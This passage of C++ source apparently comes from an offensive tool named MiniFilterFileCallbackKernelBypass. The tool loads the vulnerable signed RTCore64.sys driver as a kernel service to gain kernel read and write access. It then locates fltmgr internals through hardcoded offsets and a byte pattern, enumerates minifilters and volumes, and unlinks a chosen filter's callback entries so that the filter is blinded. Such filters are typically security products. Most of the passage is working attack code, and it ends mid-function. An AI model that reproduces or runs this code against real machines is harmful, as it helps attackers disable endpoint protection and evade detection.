	//fffff800`350c9104 4c8b154d10fdff  mov     r10, qword ptr[FLTMGR!_imp_ExAcquireFastResourceShared(fffff800`3509a158)]
	//fffff800`350c910b e820da146e      call    nt!ExAcquireFastResourceShared(fffff800`a3216b30)
	
	while (StartSearch <= EndSearch) {
		if ((((PBYTE)StartSearch)[0] == patternFltGlobals[0]) && (((PBYTE)StartSearch)[1] == patternFltGlobals[1]) && (((PBYTE)StartSearch)[2] == patternFltGlobals[2])) {
			distance = *(PDWORD)((DWORD_PTR)StartSearch + 3);
			pFltGlobals = (LPVOID)((DWORD_PTR)StartSearch + distance + 7);
			break;
		}

		StartSearch = (LPVOID)((DWORD64)StartSearch + 0x01);
	}

	// Calculate offset
	DWORD Offset = (DWORD)pFltGlobals - (DWORD)hFltmgr;

	return (LPVOID) ((DWORD64) lpkFltMgrBase + (DWORD64) Offset - patternFltGlobals[3]);
}

FltManager::FltManager(MemHandler* objMemHandlerArg)
{

	this->objMemHandler = objMemHandlerArg;
	this->lpNtosBase = this->ResolveDriverBase(L"ntoskrnl.exe");
	this->lpFltMgrBase = ResolveDriverBase(L"fltmgr.sys");
	this->lpFltGlobals = ResolveFltmgrGlobals(this->lpFltMgrBase);

	bool b = this->objMemHandler->VirtualRead(
		((SIZE_T)this->lpFltGlobals + FLTGLB_OFFSET_FLT_RESOURCE_LISTHEAD + FLT_RESOURCE_LISTHEAD_OFFSET_FRAME_COUNT),
		&this->ulNumFrames,
		sizeof(ULONG)
	);
	if (!b) {
		puts("Could not read frame count");
		return;
	}

	b = this->objMemHandler->VirtualRead(
		((SIZE_T)this->lpFltGlobals + FLTGLB_OFFSET_FLT_RESOURCE_LISTHEAD + FLT_RESOURCE_LISTHEAD_OFFSET_FRAME_LIST),
		&this->lpFltFrameList,
		sizeof(PVOID)
	);
	if (!b) {
		puts("Could not read frame list");
		return;
	}
}

PVOID FltManager::GetFilterByName(const wchar_t* strFilterName)
{
	PVOID lpListHead = NULL;
	PVOID lpFlink = NULL;
	DWORD64 lpFltFrame = NULL;
	ULONG ulFiltersInFrame = 0;

	DWORD64 qwFrameListIter = 0;
	DWORD64 qwFrameListHead = 0;
	DWORD64 lpFilter = 0;

	bool b = this->objMemHandler->VirtualRead(
		(DWORD64)this->lpFltFrameList,
		&lpListHead,
		sizeof(PVOID)
	);
	if (!b) {
		puts("Failed to read frame list head!");
		return NULL;
	}

	printf("List of filters at - %p\n", lpListHead);

	// for each frame
	for (ULONG i = 0; i < this->ulNumFrames; i++) {
		printf("===== FRAME %d =====\n", i);
		// read the flink
		b = this->objMemHandler->VirtualRead(
			(DWORD64)lpListHead,
			&lpFlink,
			sizeof(PVOID)
		);
		if (!b) {
			puts("Failed to read frame list flink!");
			return NULL;
		}
		// now that we've read the FLINK, subtract 0x8 to give us the adjusted _FLTP_FRAME*
		lpFltFrame = (DWORD64)lpFlink - 0x8;
		// now we need to read the number of filters associated with this frame

		printf(
			"Reading count of filters from %llx\n",
			lpFltFrame + FLT_FRAME_OFFSET_FILTER_RESOUCE_LISTHEAD + FILTER_RESOUCE_LISTHEAD_OFFSET_COUNT
		);

		b = this->objMemHandler->VirtualRead(
			lpFltFrame + FLT_FRAME_OFFSET_FILTER_RESOUCE_LISTHEAD + FILTER_RESOUCE_LISTHEAD_OFFSET_COUNT,
			&ulFiltersInFrame,
			sizeof(ULONG)
		);
		if (!b) {
			puts("Failed to read filter count for frame!");
			return NULL;
		}
		printf("Found %d filters for frame\n", ulFiltersInFrame);

		b = this->objMemHandler->VirtualRead(
			lpFltFrame + FLT_FRAME_OFFSET_FILTER_RESOUCE_LISTHEAD + FILTER_RESOUCE_LISTHEAD_OFFSET_FILTER_LISTHEAD,
			&qwFrameListHead,
			sizeof(DWORD64)
		);

		if (!b) {
			puts("Failed to read frame list head!");
			return NULL;
		}


		qwFrameListIter = qwFrameListHead;

		for (ULONG j = 0; j < ulFiltersInFrame; j++) {
			DWORD64 qwFilterName = 0;
			DWORD64 qwFilterNameBuffPtr = 0;
			USHORT Length = 0;

			// adjust by subtracting 0x10 to give us a pointer to our filter
			lpFilter = qwFrameListIter - 0x10;
			qwFilterName = lpFilter + FILTER_OFFSET_NAME;

			// now we read the length of the name
			b = this->objMemHandler->VirtualRead(
				qwFilterName + UNISTR_OFFSET_LEN,
				&Length,
				sizeof(USHORT)
			);

			if (!b) {
				puts("Failed to read size of string for filter name!");
				return NULL;
			}
			// find the pointer to the name buffer
			b = this->objMemHandler->VirtualRead(
				qwFilterName + UNISTR_OFFSET_BUF,
				&qwFilterNameBuffPtr,
				sizeof(DWORD64)
			);
			if (!b) {
				puts("Failed to read buffer pointer for filter name!");
				return NULL;
			}

			// allocate a buffer for the name
			wchar_t* buf = new wchar_t[((SIZE_T)Length) + 2];
			memset(buf, 0, ((SIZE_T)Length) + 2);

			// now read in the actual name
			b = this->objMemHandler->VirtualRead(
				qwFilterNameBuffPtr,
				buf,
				Length
			);
			if (!b) {
				puts("Failed to read buffer pointer for filter name!");
				delete[] buf;
				return NULL;
			}
			printf("\t\nFilter %d - %S", j, buf);
			// compare it to our desired filter

			if (!lstrcmpiW(buf, strFilterName)) {
				printf("\nFound target filter at %llx\n", lpFilter);
				return (PVOID)lpFilter;
			}

			// read in the next flink
			b = this->objMemHandler->VirtualRead(
				qwFrameListIter,
				&qwFrameListIter,
				sizeof(DWORD64)
			);


			if (!b) {
				puts("Failed to read next flink!");
				delete[] buf;
				return NULL;
			}

			// free the buffer 
			delete[] buf;
		}
		// read the list of registered filters in the frame

	}
	printf("\nFailed to find filter matching name %S\n", strFilterName);
	return NULL;
}
PVOID FltManager::GetFrameForFilter(LPVOID lpFilter)
{
	PVOID lpFrame = NULL;

	bool b = this->objMemHandler->VirtualRead(
		(DWORD64)lpFilter + FILTER_OFFSET_FRAME,
		&lpFrame,
		sizeof(PVOID)
	);

	if (!b) {
		puts("Failed to read filter frame!");
		return NULL;
	}

	return lpFrame;
}

std::vector<FLT_OPERATION_REGISTRATION> FltManager::GetOperationsForFilter(PVOID lpFilter)
{
	std::vector<FLT_OPERATION_REGISTRATION> retVec = std::vector<FLT_OPERATION_REGISTRATION>();
	if (!lpFilter) {
		puts("lpFilter is NULL!");
		return retVec;
	}

	DWORD64 qwOperationRegIter = 0;
	DWORD64 qwOperationRegPtr = 0;

	// first we read the pointer to the table of FLT_OPERATION_REGISTRATION
	bool b = this->objMemHandler->VirtualRead(
		(DWORD64)lpFilter + FILTER_OFFSET_OPERATIONS,
		&qwOperationRegPtr,
		sizeof(DWORD64)
	);

	if (!b) {
		puts("Failed to read Operation Registration Ptr!");
		return  std::vector<FLT_OPERATION_REGISTRATION>();
	}


	printf("Operations at %llx\n", qwOperationRegPtr);
	while (TRUE) {
		FLT_OPERATION_REGISTRATION* fltIter = new FLT_OPERATION_REGISTRATION();
		b = this->objMemHandler->VirtualRead(
			qwOperationRegPtr,
			fltIter,
			sizeof(FLT_OPERATION_REGISTRATION)
		);

		if (!b) {
			puts("Failed to read next Operation Registration!");
			return  std::vector<FLT_OPERATION_REGISTRATION>();
		}

		// read until we get IRP_MJ_OPERATION_END
		if (fltIter->MajorFunction == IRP_MJ_OPERATION_END) {
			break;
		}
		retVec.push_back(*fltIter);
		qwOperationRegPtr += sizeof(FLT_OPERATION_REGISTRATION);
	}

	return retVec;
}

std::unordered_map<wchar_t*, PVOID> FltManager::EnumFrameVolumes(LPVOID lpFrame)
{
	ULONG ulNumVolumes = 0;
	DWORD64 qwListIter = 0;

	std::unordered_map<wchar_t*, PVOID> retVal;

	// first we read the count of volumes
	bool b = this->objMemHandler->VirtualRead(
		(DWORD64)lpFrame + FRAME_OFFSET_VOLUME_LIST + VOLUME_LIST_OFFSET_COUNT,
		&ulNumVolumes,
		sizeof(ULONG)
	);
	if (!b) {
		puts("Failed to read volume count!");
		return  std::unordered_map<wchar_t*, PVOID>();
	}

	printf("Found %d attached volumes for frame %p\n", ulNumVolumes, lpFrame);

	// read the list head
	b = this->objMemHandler->VirtualRead(
		(DWORD64)lpFrame + FRAME_OFFSET_VOLUME_LIST + VOLUME_LIST_OFFSET_LIST,
		&qwListIter,
		sizeof(DWORD64)
	);
	if (!b) {
		puts("Failed to read volume list head!");
		return  std::unordered_map<wchar_t*, PVOID>();
	}

	for (ULONG i = 0; i < ulNumVolumes; i++) {
		DWORD64 lpVolume = qwListIter - 0x10;
		DWORD64 lpBuffer = lpVolume + VOLUME_OFFSET_DEVICE_NAME + UNISTR_OFFSET_BUF;
		DWORD64 lpBufferLen = lpVolume + VOLUME_OFFSET_DEVICE_NAME + UNISTR_OFFSET_LEN;
		DWORD64 lpBufferPtr = 0;
		ULONG ulDeviceNameLen = 0;

		// read the string length first
		b = this->objMemHandler->VirtualRead(
			lpBufferLen,
			&ulDeviceNameLen,
			sizeof(USHORT)
		);
		if (!b) {
			puts("Failed to read unicode string length!");
			return  std::unordered_map<wchar_t*, PVOID>();
		}

		// read the pointer to the buffer
		b = this->objMemHandler->VirtualRead(
			lpBuffer,
			&lpBufferPtr,
			sizeof(DWORD64)
		);
		if (!b) {
			puts("Failed to read unicode string buffer ptr!");
			return  std::unordered_map<wchar_t*, PVOID>();
		}

		// then read the actual buffer
		wchar_t* buf = new wchar_t[(SIZE_T)ulDeviceNameLen + 2];
		memset(buf, 0, (SIZE_T)ulDeviceNameLen + 2);

		b = this->objMemHandler->VirtualRead(
			lpBufferPtr,
			buf,
			ulDeviceNameLen
		);
		if (!b) {
			puts("Failed to read unicode string buffer!");
			return  std::unordered_map<wchar_t*, PVOID>();
		}

		retVal[buf] = (PVOID)lpVolume;

		printf("%d\t%S\n", i, buf);

		// go to the next link
		b = this->objMemHandler->VirtualRead(
			(DWORD64)qwListIter,
			&qwListIter,
			sizeof(DWORD64)
		);

		if (!b) {
			puts("Failed to read next volume link!");
			return  std::unordered_map<wchar_t*, PVOID>();
		}
	}
	return retVal;
}

DWORD FltManager::GetFrameCount()
{
	return this->ulNumFrames;
}

BOOL FltManager::UnLinksForVolumesAndCallbacks(
	std::vector<FLT_OPERATION_REGISTRATION> vecTargetOperations,
	std::unordered_map<wchar_t*, PVOID> mapTargetVolumes,
	UCHAR ToRemove
)
{
	ULONG numPatched = 0;
	for (const FLT_OPERATION_REGISTRATION& op : vecTargetOperations) {

		UCHAR index = (UCHAR)op.MajorFunction + 22;

		if (ToRemove != 0 && index != ToRemove) {
			continue;
		}

		for (auto& vol : mapTargetVolumes) {
			if (index > 50) {
				printf("Skipping non-indexed adjusted major fn - %d", index);
				continue;
			}

			DWORD64 lpTargetCallbackListEntryPtr = (DWORD64)vol.second + VOLUME_OFFSET_CALLBACK_TBL + ((DWORD64)index * 0x10);
			printf("\n==== Volume: %S ====\n\tMajFn %d\n\tListEntryPtr - %llx\n", vol.first, index, lpTargetCallbackListEntryPtr);
			DWORD64 lpListHead = 0;
			DWORD64 lpListIter = 0;

			bool b = this->objMemHandler->VirtualRead(
				lpTargetCallbackListEntryPtr,
				&lpListHead,
				sizeof(DWORD64)
			);

			if (!b) return FALSE;

			lpListIter = lpListHead;

			int linknumbers = 0;
			do {
				// read in the preop and post-op
				// operations[0] = PreOp
				// operations[1] = PostOp

				DWORD64 operations[2] = { 0 };
				bool b = this->objMemHandler->VirtualRead(
					lpListIter + CALLBACK_NODE_OFFSET_PREOP,
					operations,
					sizeof(operations)
				);
				if (!b) return FALSE;

				if ((operations[0] == (DWORD64)op.PreOperation && op.PreOperation != NULL) ||
				(operations[1] == (DWORD64)op.PostOperation && op.PostOperation != NULL)){
					printf("\t lpListIter: %llx \n", lpListIter);

					DWORD64 prevNodeAddress = 0x00;
					DWORD64 nextNodeAddress = 0x00;
					bool b = this->objMemHandler->VirtualRead(
						lpListIter + offsetof(LIST_ENTRY, Blink),
						&prevNodeAddress,
						sizeof(DWORD64)
					);

					b = this->objMemHandler->VirtualRead(
						lpListIter + offsetof(LIST_ENTRY, Flink),
						&nextNodeAddress,
						sizeof(DWORD64)
					);

					// Store the old and new values in the map
					DWORD64 BlinkToRestore = 0x00;
					DWORD64 FlinkToRestore = 0x00;
					b = this->objMemHandler->VirtualRead(
						nextNodeAddress + offsetof(LIST_ENTRY, Blink),
						&BlinkToRestore,
						sizeof(DWORD64)
					);

					b = this->objMemHandler->VirtualRead(
						prevNodeAddress + offsetof(LIST_ENTRY, Flink),
						&FlinkToRestore,
						sizeof(DWORD64)
					);


					patchLinksMap[nextNodeAddress + offsetof(LIST_ENTRY, Blink)] = std::make_pair(BlinkToRestore, prevNodeAddress);
					patchLinksMap[prevNodeAddress + offsetof(LIST_ENTRY, Flink)] = std::make_pair(FlinkToRestore, nextNodeAddress);
					//

					b = this->objMemHandler->WriteMemoryDWORD64(
						nextNodeAddress + offsetof(LIST_ENTRY, Blink),
						prevNodeAddress
					);

					b = this->objMemHandler->WriteMemoryDWORD64(
						prevNodeAddress + offsetof(LIST_ENTRY, Flink),
						nextNodeAddress
					);

					puts("\t\t** PATCHED!");
					numPatched++;
				}

				// read the next FLINK
				b = this->objMemHandler->VirtualRead(
					lpListIter,
					&lpListIter,
					sizeof(DWORD64)
				);

				linknumbers++;
				if (!b) return FALSE;
			} while (lpListIter != lpTargetCallbackListEntryPtr);
			printf("linknumbers: %d\n", linknumbers);
		}
	}
	printf("Patched %d links\n", numPatched);
	return TRUE;
}

BOOL FltManager::Restore() {
	BOOL b = false;
	if (patchCallbackMap.size() > 0) {
		for (const auto& entry : patchCallbackMap) {
			DWORD64 address = entry.first;
			DWORD64 oldValue = entry.second.first;  // The old value we want to restore

			printf("Restoring value at address: %llx to old value: %llx\n", address, oldValue);

			// Write the old value back to the original memory location
			b = this->objMemHandler->WriteMemoryDWORD64(address, oldValue);

			if (!b) {
				printf("Failed to restore at address: %llx\n", address);
				return FALSE;
			}
		}
	}
	if (patchLinksMap.size() > 0) {
		for (const auto& entry : patchLinksMap) {
			DWORD64 address = entry.first;
			DWORD64 oldValue = entry.second.first;  // The old value we want to restore

			printf("Restoring value at address: %llx to old value: %llx\n", address, oldValue);

			// Write the old value back to the original memory location
			b = this->objMemHandler->WriteMemoryDWORD64(address, oldValue);

			if (!b) {
				printf("Failed to restore at address: %llx\n", address);
				return FALSE;
			}
		}
	}
	return b;
}

FltManager::~FltManager()
{
}

```

`MiniFilterFileCallbackKernelBypass/MiniFilterFileCallbackernelBypass/FltUtil.h`:

```h
#pragma once
#include <Windows.h>
#include <Psapi.h>
#include <stdio.h>
#include <vector>
#include <unordered_map>
#include "FltDef.h"
#include "MemHandler.h"
#include <map>

// I can hear the OSR replies now... 
#define FLTGLB_OFFSET_FLT_RESOURCE_LISTHEAD 0x58
#define FLT_RESOURCE_LISTHEAD_OFFSET_FRAME_LIST 0x68
#define FLT_RESOURCE_LISTHEAD_OFFSET_FRAME_COUNT 0x78

#define FLT_FRAME_OFFSET_FILTER_RESOUCE_LISTHEAD 0x48
#define FILTER_RESOUCE_LISTHEAD_OFFSET_COUNT 0x78
#define FILTER_RESOUCE_LISTHEAD_OFFSET_FILTER_LISTHEAD 0x68

#define FILTER_OFFSET_NAME 0x40
#define FILTER_OFFSET_FRAME 0x38
#define FILTER_OFFSET_OPERATIONS 0x1b0
#define FILTER_OFFSET_INSTANCELIST 0x68

#define FILTER_INSTANCELIST_OFFSET_INSTANCES_COUNT 0x78
#define FILTER_INSTANCELIST_OFFSET_INSTANCES_LIST 0x68

#define FRAME_OFFSET_VOLUME_LIST 0xc8
#define VOLUME_LIST_OFFSET_COUNT 0x78
#define VOLUME_LIST_OFFSET_LIST 0x68

#define VOLUME_OFFSET_DEVICE_NAME 0x70
#define VOLUME_OFFSET_CALLBACK_TBL 0x140

#define CALLBACK_NODE_OFFSET_PREOP 0x18
#define CALLBACK_NODE_OFFSET_POSTOP 0x20

#define UNISTR_OFFSET_LEN 0
#define UNISTR_OFFSET_BUF 8

//FLTMGR!FltEnumerateFilters + 0x81:
//fffff800`350c90e1 e87a59316e      call    nt!ExInitializeFastOwnerEntry(fffff800`a33dea60)
//fffff800`350c90e6 4c8b157310fdff  mov     r10, qword ptr[FLTMGR!_imp_KeEnterCriticalRegion(fffff800`3509a160)]
//fffff800`350c90ed e8fe23326e      call    nt!KeEnterCriticalRegion(fffff800`a33eb4f0)
//fffff800`350c90f2 41b001          mov     r8b, 1
//fffff800`350c90f5 488d942480000000 lea     rdx, [rsp + 80h]
//fffff800`350c90fd 488d0d9476fcff  lea     rcx, [FLTMGR!FltGlobals + 0x58 (fffff800`35090798)]
//fffff800`350c9104 4c8b154d10fdff  mov     r10, qword ptr[FLTMGR!_imp_ExAcquireFastResourceShared(fffff800`3509a158)]
//fffff800`350c910b e820da146e      call    nt!ExAcquireFastResourceShared(fffff800`a3216b30)
const uint8_t patternFltGlobals[] = { 0x48, 0x8d, 0x0d, 0x58 };

class FltManager
{
public:
	FltManager(MemHandler* objMemHandler);
	~FltManager();
	PVOID lpNtosBase = { 0 };
	PVOID lpFltMgrBase = { 0 };
	PVOID lpFltGlobals = { 0 };
	PVOID lpFltFrameList = { 0 };
	std::map<DWORD64, std::pair<DWORD64, DWORD64>> patchCallbackMap;
	std::map<DWORD64, std::pair<DWORD64, DWORD64>> patchLinksMap;
	std::map<DWORD64, std::pair<DWORD64, DWORD64>> patchCFGMap;
	PVOID GetFilterByName(const wchar_t* strFilterName);
	PVOID GetFrameForFilter(LPVOID lpFilter);
	std::vector<FLT_OPERATION_REGISTRATION> GetOperationsForFilter(PVOID lpFilter);
	BOOL Restore();
	std::unordered_map<wchar_t*, PVOID> EnumFrameVolumes(LPVOID lpFrame);
	DWORD GetFrameCount();
	BOOL UnLinksForVolumesAndCallbacks(
		std::vector<FLT_OPERATION_REGISTRATION> vecTargetOperations,
		std::unordered_map<wchar_t*, PVOID> mapTargetVolumes,
		UCHAR ToRemove
	);

private:
	ULONG ulNumFrames;
	PVOID ResolveDriverBase(const wchar_t* strDriverName);
	PVOID ResolveFltmgrGlobals(LPVOID lpkFltMgrBase);
	MemHandler* objMemHandler;

};

static std::unordered_map<BYTE, const char*> g_IrpMjMap{
	{0, "IRP_MJ_CREATE"},
	{1, "IRP_MJ_CREATE_NAMED_PIPE"},
	{2, "IRP_MJ_CLOSE"},
	{3, "IRP_MJ_READ"},
	{4, "IRP_MJ_WRITE"},
	{5, "IRP_MJ_QUERY_INFORMATION"},
	{6, "IRP_MJ_SET_INFORMATION"},
	{7, "IRP_MJ_QUERY_EA"},
	{8, "IRP_MJ_SET_EA"},
	{9, "IRP_MJ_FLUSH_BUFFERS"},
	{0xa, "IRP_MJ_QUERY_VOLUME_INFORMATION"},
	{0xb, "IRP_MJ_SET_VOLUME_INFORMATION"},
	{0xc, "IRP_MJ_DIRECTORY_CONTROL"},
	{0xd, "IRP_MJ_FILE_SYSTEM_CONTROL"},
	{0xe, "IRP_MJ_DEVICE_CONTROL"},
	{0xf, "IRP_MJ_INTERNAL_DEVICE_CONTROL"},
	{0x10, "IRP_MJ_SHUTDOWN"},
	{0x11, "IRP_MJ_LOCK_CONTROL"},
	{0x12, "IRP_MJ_CLEANUP"},
	{0x13, "IRP_MJ_CREATE_MAILSLOT"},
	{0x14, "IRP_MJ_QUERY_SECURITY"},
	{0x15, "IRP_MJ_SET_SECURITY"},
	{0x16, "IRP_MJ_POWER"},
	{0x17, "IRP_MJ_SYSTEM_CONTROL"},
	{0x18, "IRP_MJ_DEVICE_CHANGE"},
	{0x19, "IRP_MJ_QUERY_QUOTA"},
	{0x1a, "IRP_MJ_SET_QUOTA"},
	{0x1b, "IRP_MJ_PNP"},
	{0x1b, "IRP_MJ_PNP_POWER"},
	{0x1b, "IRP_MJ_MAXIMUM_FUNCTION"},
	{((UCHAR)-1), "IRP_MJ_ACQUIRE_FOR_SECTION_SYNCHRONIZATION"},
	{((UCHAR)-2), "IRP_MJ_RELEASE_FOR_SECTION_SYNCHRONIZATION"},
	{((UCHAR)-3), "IRP_MJ_ACQUIRE_FOR_MOD_WRITE"},
	{((UCHAR)-4), "IRP_MJ_RELEASE_FOR_MOD_WRITE"},
	{((UCHAR)-5), "IRP_MJ_ACQUIRE_FOR_CC_FLUSH"},
	{((UCHAR)-6), "IRP_MJ_RELEASE_FOR_CC_FLUSH"},
	{((UCHAR)-7), "IRP_MJ_QUERY_OPEN"},
	{((UCHAR)-13), "IRP_MJ_FAST_IO_CHECK_IF_POSSIBLE"},
	{((UCHAR)-14), "IRP_MJ_NETWORK_QUERY_OPEN"},
	{((UCHAR)-15), "IRP_MJ_MDL_READ"},
	{((UCHAR)-16), "IRP_MJ_MDL_READ_COMPLETE"},
	{((UCHAR)-17), "IRP_MJ_PREPARE_MDL_WRITE"},
	{((UCHAR)-18), "IRP_MJ_MDL_WRITE_COMPLETE"},
	{((UCHAR)-19), "IRP_MJ_VOLUME_MOUNT"},
	{((UCHAR)-20), "IRP_MJ_VOLUME_DISMOUNT"}
};

```

`MiniFilterFileCallbackKernelBypass/MiniFilterFileCallbackernelBypass/MemHandler.cpp`:

```cpp
#include "MemHandler.h"

```

`MiniFilterFileCallbackKernelBypass/MiniFilterFileCallbackernelBypass/MemHandler.h`:

```h
#pragma once
#include <Windows.h>
class MemHandler
{
public:
    virtual BOOL VirtualRead(DWORD64 address, void* buffer, size_t bytesToRead) = 0;
    virtual BOOL WriteMemoryDWORD64(DWORD64 Address, DWORD64 Value) = 0;
};


```

`MiniFilterFileCallbackKernelBypass/MiniFilterFileCallbackernelBypass/MiniFilterFileCallbackernelBypass.cpp`:

```cpp
#include <Windows.h>
#include "memory.h"
#include "FltUtil.h"

//Mimikatz code to load / unload driver
BOOL kull_m_service_addWorldToSD(SC_HANDLE monHandle) {
	BOOL status = FALSE;
	DWORD dwSizeNeeded;
	PSECURITY_DESCRIPTOR oldSd, newSd;
	SECURITY_DESCRIPTOR dummySdForXP;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	EXPLICIT_ACCESS ForEveryOne = {
		SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_INTERROGATE | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE | SERVICE_START | SERVICE_STOP | SERVICE_USER_DEFINED_CONTROL | READ_CONTROL,
		SET_ACCESS,
		NO_INHERITANCE,
		{NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_SID, TRUSTEE_IS_WELL_KNOWN_GROUP, NULL}
	};
	if (!QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, &dummySdForXP, 0, &dwSizeNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER)) {
		if (oldSd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, dwSizeNeeded)) {
			if (QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, oldSd, dwSizeNeeded, &dwSizeNeeded)) {
				if (AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID*)&ForEveryOne.Trustee.ptstrName)) {
					if (BuildSecurityDescriptor(NULL, NULL, 1, &ForEveryOne, 0, NULL, oldSd, &dwSizeNeeded, &newSd) == ERROR_SUCCESS) {
						status = SetServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, newSd);
						LocalFree(newSd);
					}
					FreeSid(ForEveryOne.Trustee.ptstrName);
				}
			}
			LocalFree(oldSd);
		}
	}
	return status;
}

DWORD service_install(PCWSTR serviceName, PCWSTR displayName, PCWSTR binPath, DWORD serviceType, DWORD startType, BOOL startIt) {
	BOOL status = FALSE;
	SC_HANDLE hSC = NULL, hS = NULL;

	if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE)) {
		if (hS = OpenService(hSC, serviceName, SERVICE_START)) {
			wprintf(L"[+] \'%s\' service already registered\n", serviceName);
		}
		else {
			if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
				wprintf(L"[*] \'%s\' service not present\n", serviceName);
				if (hS = CreateService(hSC, serviceName, displayName, READ_CONTROL | WRITE_DAC | SERVICE_START, serviceType, startType, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL)) {
					wprintf(L"[+] \'%s\' service successfully registered\n", serviceName);
					if (status = kull_m_service_addWorldToSD(hS))
						wprintf(L"[+] \'%s\' service ACL to everyone\n", serviceName);
					else printf("kull_m_service_addWorldToSD");
				}
				else PRINT_ERROR_AUTO(L"CreateService");
			}
			else PRINT_ERROR_AUTO(L"OpenService");
		}
		if (hS) {
			if (startIt) {
				if (status = StartService(hS, 0, NULL))
					wprintf(L"[+] \'%s\' service started\n", serviceName);
				else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
					wprintf(L"[*] \'%s\' service already started\n", serviceName);
				else {
					PRINT_ERROR_AUTO(L"StartService");
				}
			}
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	else {
		PRINT_ERROR_AUTO(L"OpenSCManager(create)");
		return GetLastError();
	}
	return 0;
}

BOOL kull_m_service_genericControl(PCWSTR serviceName, DWORD dwDesiredAccess, DWORD dwControl, LPSERVICE_STATUS ptrServiceStatus) {
	BOOL status = FALSE;
	SC_HANDLE hSC, hS;
	SERVICE_STATUS serviceStatus;

	if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
		if (hS = OpenService(hSC, serviceName, dwDesiredAccess)) {
			status = ControlService(hS, dwControl, ptrServiceStatus ? ptrServiceStatus : &serviceStatus);
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	return status;
}

BOOL service_uninstall(PCWSTR serviceName) {
	if (kull_m_service_genericControl(serviceName, SERVICE_STOP, SERVICE_CONTROL_STOP, NULL)) {
		wprintf(L"[+] \'%s\' service stopped\n", serviceName);
	}
	else if (GetLastError() == ERROR_SERVICE_NOT_ACTIVE) {
		wprintf(L"[*] \'%s\' service not running\n", serviceName);
	}
	else {
		PRINT_ERROR_AUTO(L"kull_m_service_stop");
		return FALSE;
	}

	if (SC_HANDLE hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
		if (SC_HANDLE hS = OpenService(hSC, serviceName, DELETE)) {
			BOOL status = DeleteService(hS);
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	return TRUE;
}
// thanks gentilkiwi!

int main(int argc, char** argv) {
	if (argc < 2) {
		printf("Usage: %s\n"
			" /filtersshow <filtername> - List Filters or Major Function for a filter\n"
			" /filterlinks <filtername> - Remove Filters related to that driver\n"
			" /installDriver - Install the MSI driver\n"
			" /uninstallDriver - Uninstall the MSI driver\n"
			, argv[0]);
		return 0;
	}

	if (strcmp(argv[1] + 1, "installDriver") == 0) {
		const auto svcName = L"RTCore64";
		const auto svcDesc = L"Micro-Star MSI Afterburner";
		const wchar_t driverName[] = L"\\RTCore64.sys";
		const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
		TCHAR driverPath[pathSize];
		GetCurrentDirectory(pathSize, driverPath);
		wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));

		if (auto status = service_install(svcName, svcDesc, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE) == 0x00000005) {
			wprintf(L"[!] 0x00000005 - Access Denied - Did you run as administrator?\n");
		}
		return 0;
	}
	else if (strcmp(argv[1] + 1, "uninstallDriver") == 0) {
		const auto svcName = L"RTCore64";
		const auto svcDesc = L"Micro-Star MSI Afterburner";
		const wchar_t driverName[] = L"\\RTCore64.sys";
		const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
		TCHAR driverPath[pathSize];
		GetCurrentDirectory(pathSize, driverPath);
		wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));
		service_uninstall(svcName);
		return 0;
	}

	char* strFilterName = (char*) "test";
	char* strDriverName;
	UCHAR indexToRemove = 0;
	DWORD64 AddressToRemove = 0x00;
	if ((!strcmp(argv[1] + 1, "filtersshow") || !strcmp(argv[1] + 1, "filterlinks")) && argv[2] != NULL ) {
		strFilterName = argv[2];
	}
	if ((!strcmp(argv[1] + 1, "filterlinks")) && argc > 3 && argv[3] != NULL) {
		char* inputString = argv[3];
		int inputValue = std::atoi(inputString);
		indexToRemove = static_cast<UCHAR>(inputValue);
	}
	if (!strcmp(argv[1] + 1, "networkfilters") && argv[2] != NULL && !strcmp(argv[2] + 1, "address") && argc > 3 && argv[3] != NULL) {
		AddressToRemove = (DWORD64) argv[3];
	}

	Memory m = Memory();
	FltManager oFlt = FltManager(&m);

	if (!strcmp(argv[1] + 1, "filtersshow") || !strcmp(argv[1] + 1, "filterlinks")) {
		wchar_t* wstrFilterName = new wchar_t[strlen(strFilterName) + 2];
		size_t numConv = 0;
		mbstowcs_s(&numConv, wstrFilterName, strlen(strFilterName) + 2, strFilterName, strlen(strFilterName));
		printf("Enumerating for filter %S\n", wstrFilterName);

		DWORD dwX = oFlt.GetFrameCount();
		printf("Flt globals is at %p\n", oFlt.lpFltGlobals);
		printf("%d frames available\n", dwX);
		printf("Frame list is at %p\n", oFlt.lpFltFrameList);

		PVOID lpFilter = oFlt.GetFilterByName(wstrFilterName);
		if (!lpFilter) {
			puts("Target filter not found, exiting...");
			exit(-1);
		}

		PVOID lpFrame = oFlt.GetFrameForFilter(lpFilter);
		if (!lpFrame) {
			puts("Failed to get frame for filter!");
			exit(-1);
		}

		printf("Frame for filter is at %p\n", lpFrame);

		auto vecOperations = oFlt.GetOperationsForFilter(lpFilter);
		for (auto op : vecOperations) {
